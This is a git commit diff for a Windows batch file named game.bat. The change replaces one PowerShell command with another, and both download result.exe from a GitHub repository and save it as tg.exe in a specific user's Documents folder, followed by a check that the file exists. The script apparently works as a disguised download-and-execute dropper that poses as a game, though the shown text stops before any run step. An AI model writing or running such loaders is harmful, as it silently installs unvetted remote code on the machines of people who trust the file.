1ea62f1f9d4e400fe4905c78df5e5c491f5d93b6
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-07 20:56:54 +0330

    Update game.bat

--- game.bat
+++ game.bat
@@ -1,4 +1,4 @@
-PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\hhaam687\Documents\tg.exe'"
+PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\hhaam687\Documents\tg.exe')"
 
 :check
 	if "C:\Users\hhaam687\Documents\tg.exe" exist (
